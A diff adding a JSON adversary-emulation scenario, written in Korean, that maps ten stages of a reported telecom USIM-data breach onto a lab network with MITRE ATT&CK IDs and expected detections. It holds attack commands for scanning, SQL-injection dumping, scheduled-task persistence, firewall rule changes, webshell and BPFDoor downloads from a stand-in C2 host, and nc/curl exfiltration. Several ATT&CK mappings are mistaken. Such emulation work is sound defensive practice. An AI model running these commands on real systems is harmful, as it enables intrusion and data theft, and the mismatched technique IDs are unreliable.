@@ -1,0 +1,319 @@
+[
+  {
+    "S_ID": 1,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1595.002",
+        "reason": "공격자는 외부 인터넷 연결 접점이 있는 PFSense VM을 통해 공개된 정보를 수집하여 취약점을 찾고 공격 대상을 선정합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "PFSense VM(192.168.73.x)",
+    "Title": "외부 시스템 정보 수집 (Reconnaissance)",
+    "Description": {
+      "preconditions": "공격자는 외부 네트워크에 위치합니다.",
+      "vantage_point": "공격자 시스템",
+      "technique": "공격자는 PFSense VM의 외부 IP 주소(192.168.73.x)를 대상으로 포트 스캔을 수행하여 방화벽 및 로드밸런스 역할을 확인합니다. 또한, DNS 레코드를 조회하고 서비스 배너를 획득하여 내부 네트워크 구성에 대한 정보를 수집합니다.",
+      "commands": [
+        "nmap -sV -p 80,443,3389 192.168.73.x",
+        "dig A pfsense.example.com",
+        "curl -I http://192.168.73.x"
+      ],
+      "protocol_ports": "TCP/80, 443, 3389, UDP/53",
+      "artifacts": "N/A"
+    },
+    "Expected Actions": "네트워크 관리자는 방화벽 로그에서 비정상적인 포트 스캔 시도를 탐지하고 차단합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "보고서에는 초기 침투 전 정찰 행위가 직접적으로 명시되어 있지 않으나, 공격의 일반적인 순서에 따라 합리적으로 추론했습니다."
+    }
+  },
+  {
+    "S_ID": 2,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1190",
+        "reason": "공격자는 외부에서 접근 가능한 Web-Log 플랫폼의 취약점을 악용합니다."
+      },
+      {
+        "id": "T1566.002",
+        "reason": "공격자는 취약한 웹 플랫폼을 통해 악성코드를 전달합니다."
+      }
+    ],
+    "Delivery Method": "Web Exploit",
+    "Target": "server 1(192.168.70.1)",
+    "Title": "초기 침투 및 악성코드 설치 (Exploitation & Installation)",
+    "Description": {
+      "preconditions": "공격자는 PFSense VM의 로드밸런싱 설정으로 인해 server 1에 접근할 수 있습니다. server 1의 Web-Log 플랫폼은 취약한 버전의 WordPress를 사용하고 있습니다.",
+      "vantage_point": "공격자 시스템",
+      "technique": "공격자는 WordPress 플랫폼의 파일 업로드 취약점 또는 원격 코드 실행(RCE) 취약점을 악용하여 'CrossC2' 에이전트 파일을 server 1에 업로드하고 실행합니다. 'CrossC2'는 내부 네트워크 정찰 및 제어를 위한 백도어 기능을 포함합니다.",
+      "commands": [
+        "curl -F 'file=@/path/to/malicious_c2_agent.php' 'http://192.168.73.x/wp-content/plugins/vulnerable_plugin/upload.php'",
+        "curl 'http://192.168.73.x/wp-content/uploads/malicious_c2_agent.php'"
+      ],
+      "protocol_ports": "HTTP/80",
+      "artifacts": "/var/www/wordpress/wp-content/uploads/malicious_c2_agent.php (혹은 .jpg, .gif 등 변조된 확장자), CrossC2.exe"
+    },
+    "Expected Actions": "보안 관리자는 웹 서버 로그에서 비정상적인 파일 업로드 시도와 취약점 공격 페이로드를 탐지하고, 백신(AV) 솔루션은 'CrossC2' 에이전트 파일을 탐지합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 '외부 인터넷 연결 접점이 있는 시스템 관리망 내 서버 A에 접속 후... 악성코드를 설치(CrossC2)'라는 내용이 명시되어 있습니다. 이를 server 1에 대한 공격으로 매핑했습니다."
+    }
+  },
+  {
+    "S_ID": 3,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1059.003",
+        "reason": "공격자는 시스템 계정 정보를 수집하기 위해 서버 1의 MySQL 데이터베이스에 대해 SQL Injection을 시도합니다."
+      },
+      {
+        "id": "T1552.001",
+        "reason": "SQL Injection을 통해 데이터베이스에 저장된 계정 정보를 평문으로 덤프합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "server 1(192.168.70.1)",
+    "Title": "내부 계정정보 탈취 (Credential Access)",
+    "Description": {
+      "preconditions": "공격자는 server 1에 대한 초기 접근 권한을 확보했습니다.",
+      "vantage_point": "server 1",
+      "technique": "공격자는 Web-Log 플랫폼의 취약한 입력 필드(로그인, 검색 등)에 SQL Injection 공격을 수행하여 백엔드 MySQL 데이터베이스에 접근합니다. 'wp_users' 테이블에서 관리자 및 사용자 계정 정보(ID, 암호 해시)를 덤프합니다. 보고서 내용에 따라, 이 시나리오에서는 해시가 아닌 평문 계정 정보를 획득합니다.",
+      "commands": [
+        "sqlmap -u 'http://192.168.70.1/index.php?id=1' --batch --dump -T wp_users"
+      ],
+      "protocol_ports": "HTTP/80",
+      "artifacts": "dump.csv (덤프된 MySQL 계정 정보 파일), /root/.sqlmap/output/192.168.70.1/dump.csv"
+    },
+    "Expected Actions": "보안 관리자는 웹 애플리케이션 방화벽(WAF)에서 SQL Injection 공격을 탐지하고 차단합니다. 또한, 데이터베이스의 계정 정보가 평문으로 저장되지 않았는지 확인합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 '서버 A에는 시스템 관리망 내 서버들의 계정 정보(ID, PW)가 평문으로 저장'되었다고 명시되어 있습니다."
+    }
+  },
+  {
+    "S_ID": 4,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1021.001",
+        "reason": "공격자는 획득한 계정을 이용해 원격 데스크톱 프로토콜(RDP)을 통해 server 2로 이동합니다."
+      },
+      {
+        "id": "T1078.002",
+        "reason": "유효한 계정을 사용하여 server 2에 접속합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "server 2(192.168.70.2)",
+    "Title": "내부 시스템 이동 (Lateral Movement)",
+    "Description": {
+      "preconditions": "공격자는 server 1에서 획득한 평문 계정 정보(예: 'admin', 'password123')를 가지고 있습니다.",
+      "vantage_point": "server 1",
+      "technique": "공격자는 server 1에서 획득한 계정 정보를 사용하여 동일 네트워크 대역에 있는 server 2에 RDP로 접속합니다. 이는 시스템 관리망 내 다른 서버로의 수평 이동을 위한 첫 번째 단계입니다.",
+      "commands": [
+        "xfreerdp /u:admin /p:password123 /v:192.168.70.2"
+      ],
+      "protocol_ports": "TCP/3389",
+      "artifacts": "server 2의 RDP 연결 로그, 이벤트 뷰어 로그"
+    },
+    "Expected Actions": "보안 관리자는 RDP 서버에서 비정상적인 로그인 시도를 탐지하고, 내부 네트워크 트래픽을 모니터링하여 비정상적인 3389 포트 통신을 확인합니다.",
+    "evidence": {
+      "type": "partial_observed",
+      "reason": "보고서에 '동일한 ID, PW로 시스템 관리망 내 타 서버에 접속한 기록을 확인하였음'이라는 추정 근거가 명시되어 있어, 이를 RDP를 이용한 내부 이동으로 추론했습니다."
+    }
+  },
+  {
+    "S_ID": 5,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1053.005",
+        "reason": "공격자는 지속적인 접근을 위해 윈도우 스케줄러 작업을 생성하여 'CrossC2' 백도어를 실행합니다."
+      },
+      {
+        "id": "T1546.008",
+        "reason": "특정 시간에 실행되는 악성코드 스케줄링을 통해 영속성을 확보합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "server 2(192.168.70.2)",
+    "Title": "지속성 확보 (Persistence)",
+    "Description": {
+      "preconditions": "공격자는 server 2에 대한 접근 권한을 확보했습니다.",
+      "vantage_point": "server 2",
+      "technique": "공격자는 server 2에 원격 제어 백도어인 'CrossC2'의 복제본을 설치합니다. 시스템 재부팅 후에도 백도어가 자동으로 실행되도록 윈도우 스케줄러에 악의적인 작업을 등록합니다.",
+      "commands": [
+        "copy C:\\malware\\CrossC2.exe C:\\ProgramData\\update_service.exe",
+        "schtasks /create /tn 'UpdateService' /tr 'C:\\ProgramData\\update_service.exe' /sc onlogon /ru SYSTEM /f"
+      ],
+      "protocol_ports": "N/A",
+      "artifacts": "C:\\ProgramData\\update_service.exe, HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}"
+    },
+    "Expected Actions": "보안 관리자는 시스템 이벤트 로그에서 새로운 스케줄러 작업 생성 이벤트를 확인하고, 백신(AV) 솔루션은 'CrossC2' 복제본을 탐지하고 삭제합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "보고서에 명시된 '추가 악성코드 설치' 행위를 구체화하고, 공격 흐름상 영속성 확보가 필요하다고 판단하여 추론했습니다."
+    }
+  },
+  {
+    "S_ID": 6,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1562.001",
+        "reason": "공격자는 방화벽 설정을 조작하여 고객 관리망으로의 통신 경로를 확보합니다."
+      },
+      {
+        "id": "T1090.001",
+        "reason": "방화벽 설정을 변경하여 SOCKS 프록시 통신을 가능하게 합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "PFSense VM(192.168.70.x)",
+    "Title": "네트워크 방화벽 우회 (Defense Evasion)",
+    "Description": {
+      "preconditions": "공격자는 server 2에 대한 관리자 권한을 확보했습니다.",
+      "vantage_point": "server 2",
+      "technique": "공격자는 server 2에 설치된 'CrossC2'를 통해 내부 네트워크 방화벽인 PFSense VM에 접근하여 방화벽 규칙을 조작합니다. 시스템 관리망(192.168.70.x)에서 고객 관리망(192.168.71.x)으로의 특정 포트 통신을 허용하도록 규칙을 추가합니다.",
+      "commands": [
+        "ssh root@192.168.70.x 'pfctl -sr' >> rules.txt",
+        "ssh root@192.168.70.x 'echo 'pass in quick on lan proto tcp from 192.168.70.0/24 to 192.168.71.0/24 port 80' | pfctl -f -' "
+      ],
+      "protocol_ports": "TCP/22",
+      "artifacts": "/tmp/rules.txt, /etc/pf.conf (변경된 방화벽 설정 파일)"
+    },
+    "Expected Actions": "네트워크 관리자는 PFSense VM의 설정 변경 로그를 확인하고, 비정상적인 SSH 접속 시도를 탐지합니다.",
+    "evidence": {
+      "type": "partial_observed",
+      "reason": "보고서에 '시스템 관리망과 고객 관리망 간 통신한 기록을 확인하였고, 이를 근거로 ... 고객 관리망으로 접속이 가능한 것으로 판단'이라는 내용이 있어, 방화벽 규칙 변경을 통해 통신 경로를 확보했다고 추론했습니다."
+    }
+  },
+  {
+    "S_ID": 7,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1078.002",
+        "reason": "공격자는 확보한 유효한 계정으로 server 3에 접속합니다."
+      },
+      {
+        "id": "T1021.002",
+        "reason": "SSH를 이용해 server 3으로 원격 접속합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "server 3(192.168.71.1)",
+    "Title": "고객 관리망 침투 (Lateral Movement)",
+    "Description": {
+      "preconditions": "공격자는 시스템 관리망에서 고객 관리망으로의 통신 경로를 확보했습니다.",
+      "vantage_point": "server 2",
+      "technique": "공격자는 이전에 탈취한 평문 계정 정보(보고서에 명시된 '동일한 ID, PW')를 사용하여 SSH를 통해 Ubuntu 기반의 server 3에 접속합니다. 이는 '고객 관리망 내 고객인증 연계 서버에 접속'이라는 보고서의 행위를 재현합니다.",
+      "commands": [
+        "ssh user@192.168.71.1"
+      ],
+      "protocol_ports": "TCP/22",
+      "artifacts": "/var/log/auth.log (server 3의 SSH 접속 로그)"
+    },
+    "Expected Actions": "보안 관리자는 server 3의 SSH 로그에서 비정상적인 IP(시스템 관리망)로부터의 접속 시도를 탐지하고, 계정의 패스워드 변경 이력을 확인합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 '시스템 관리망을 통해 고객 관리망내 고객인증 연계 서버에 접속한 것으로 추정'이라는 내용이 명시되어 있습니다."
+    }
+  },
+  {
+    "S_ID": 8,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1505.003",
+        "reason": "공격자는 server 3의 Joomia 웹 서버에 웹쉘을 설치하여 원격 제어 권한을 획득합니다."
+      },
+      {
+        "id": "T1547.005",
+        "reason": "BPFDoor를 통해 시스템의 시작 프로세스에 악성코드를 등록하여 지속성을 확보합니다."
+      },
+      {
+        "id": "T1562.004",
+        "reason": "BPFDoor를 사용하여 패킷 필터링을 우회하고 은밀한 C2 통신을 수행합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "server 3(192.168.71.1)",
+    "Title": "추가 거점 확보 및 은폐 (Installation & Defense Evasion)",
+    "Description": {
+      "preconditions": "공격자는 server 3에 대한 접근 권한을 확보했습니다.",
+      "vantage_point": "server 3",
+      "technique": "공격자는 Joomia 웹 서버의 파일 업로드 취약점을 이용하거나, SSH로 접속한 후 웹 디렉터리에 웹쉘(PHP 기반)을 업로드합니다. 동시에 시스템의 네트워크 트래픽을 감청하고 필터링을 우회하기 위해 'BPFDoor'를 설치합니다. BPFDoor는 리눅스 시스템의 서비스로 등록되어 영속성을 확보합니다.",
+      "commands": [
+        "wget http://attacker-c2.com/webshell.php -O /var/www/joomia/images/webshell.php",
+        "wget http://attacker-c2.com/bpfdoor_agent -O /tmp/bpfdoor_agent",
+        "chmod +x /tmp/bpfdoor_agent",
+        "/tmp/bpfdoor_agent -i eth1"
+      ],
+      "protocol_ports": "HTTP/80, 443, Raw Sockets",
+      "artifacts": "/var/www/joomia/images/webshell.php, /etc/rc.local (BPFDoor 실행 스크립트), /tmp/bpfdoor_agent"
+    },
+    "Expected Actions": "보안 관리자는 웹 서버의 'images' 디렉터리에 실행 가능한 파일이 생성되었는지 확인하고, 비정상적인 네트워크 트래픽 패턴을 탐지합니다. 리눅스 시스템의 'rc.local' 파일 변경 이력을 모니터링합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 '웹쉘, BPFDoor 설치'가 명확하게 명시되어 있습니다."
+    }
+  },
+  {
+    "S_ID": 9,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1005",
+        "reason": "공격자는 Joomia 데이터베이스에서 고객 예약 정보와 유심 정보와 유사한 데이터를 수집합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "server 3(192.168.71.1)",
+    "Title": "민감 정보 수집 (Collection)",
+    "Description": {
+      "preconditions": "공격자는 server 3에 대한 명령 실행 권한을 확보했습니다.",
+      "vantage_point": "server 3",
+      "technique": "공격자는 웹쉘을 통해 Joomia 플랫폼의 백엔드 MySQL 데이터베이스에 접근하여 'Hotel Booking System'의 고객 예약 정보, 결제 정보 등과 같은 민감한 데이터를 조회하고, '유심 정보'와 유사한 고객 인증 데이터를 검색합니다. 이 데이터를 로컬 파일로 덤프합니다.",
+      "commands": [
+        "php -r 'echo shell_exec(\"mysqldump -u root -pPassword joomia_db > /tmp/joomia_dump.sql\");'",
+        "mysql -u root -pPassword -e 'SELECT * FROM hotel_bookings;' joomia_db > /tmp/booking_info.csv"
+      ],
+      "protocol_ports": "TCP/3306",
+      "artifacts": "/tmp/joomia_dump.sql, /tmp/booking_info.csv"
+    },
+    "Expected Actions": "데이터베이스 관리자는 데이터베이스 접근 로그에서 비정상적인 쿼리 실행 이력을 확인하고, DLP(데이터 유출 방지) 솔루션을 통해 민감 데이터가 로컬 시스템에 저장되는 행위를 탐지합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "보고서의 '유심정보 유출' 행위를 재현하기 위해 유사한 정보가 저장된 'Hotel Booking System' 데이터베이스에서 정보를 수집하는 과정을 추론했습니다."
+    }
+  },
+  {
+    "S_ID": 10,
+    "MITRE ATT&CK": [
+      {
+        "id": "T1041",
+        "reason": "공격자는 C2 서버를 통해 획득한 데이터를 외부로 유출합니다."
+      },
+      {
+        "id": "T1048.001",
+        "reason": "공격자는 외부 인터넷 연결 접점이 있는 server 1을 경유하여 데이터를 유출합니다."
+      }
+    ],
+    "Delivery Method": "N/A",
+    "Target": "server 1(192.168.70.1), server 3(192.168.71.1)",
+    "Title": "정보 유출 (Exfiltration)",
+    "Description": {
+      "preconditions": "공격자는 server 3에서 민감 데이터를 수집하여 파일로 저장했습니다.",
+      "vantage_point": "server 3",
+      "technique": "공격자는 server 3에서 획득한 민감 데이터를 압축한 후, `nc` (Netcat) 또는 `scp`와 같은 도구를 사용하여 이전에 확보한 거점인 server 1로 전송합니다. 이후 server 1에서 외부 C2 서버로 최종적으로 데이터를 유출합니다. 이는 '인터넷 연결 접점이 있는 서버 C를 거쳐 유출'이라는 보고서의 행위를 재현합니다.",
+      "commands": [
+        "ssh server1user@192.168.70.1 'nc -l -p 8888 > /tmp/exfil.zip'",
+        "nc 192.168.70.1 8888 < /tmp/joomia_dump.sql.zip",
+        "ssh server1user@192.168.70.1 'curl -F \"file=@/tmp/exfil.zip\" http://attacker-c2.com/upload.php'"
+      ],
+      "protocol_ports": "TCP/22, 8888, HTTP/80",
+      "artifacts": "/tmp/joomia_dump.sql.zip, /tmp/exfil.zip"
+    },
+    "Expected Actions": "네트워크 관리자는 방화벽 로그에서 비정상적인 데이터 전송(내부 IP 간 대량 전송, 내부에서 외부로의 비정상적인 HTTP/S 트래픽)을 탐지합니다. DLP 솔루션은 민감 정보가 포함된 파일이 네트워크를 통해 전송되는 것을 차단합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 'HSS서버 3개에 저장된 유심정보를 시스템 관리망 내 인터넷 연결 접점이 있는 서버 C를 거쳐 유출'이라는 내용이 명시되어 있어, 이를 server 3에서 server 1을 경유하는 데이터 유출로 매핑했습니다."
+    }
+  }
+]
